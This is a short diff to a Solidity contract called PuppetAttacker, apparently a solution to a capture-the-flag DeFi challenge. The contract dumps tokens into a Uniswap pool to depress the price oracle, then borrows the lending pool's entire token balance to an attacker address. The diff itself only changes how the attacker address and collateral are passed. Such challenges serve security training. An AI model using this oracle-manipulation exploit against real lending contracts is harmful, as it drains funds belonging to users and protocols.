@@ -37,26 +37,27 @@ contract PuppetAttacker {
     Uniswap_ uniswap;
     Token_ token;
     PuppetPool_ pool;
-    address payable attacker;
+    address attacker;
 
     constructor(
         address _uniswap,
         address _token,
-        address _pool
+        address _pool,
+        address _attacker
     ) payable {
         uniswap = Uniswap_(_uniswap);
         token = Token_(_token);
         pool = PuppetPool_(_pool);
-        attacker = payable(msg.sender);
+        attacker = _attacker;
     }
 
-    function attack() external {
+    function attack() external payable {
         uint256 bal = token.balanceOf(address(this));
         token.approve(address(uniswap), bal);
         uniswap.tokenToEthSwapInput(bal, 1, block.timestamp * 2);
 
         uint256 poolBalance = token.balanceOf(address(pool));
-        pool.borrow{value: 20 ether}(poolBalance, attacker);
+        pool.borrow{value: msg.value}(poolBalance, attacker);
     }
 
     receive() external payable {}
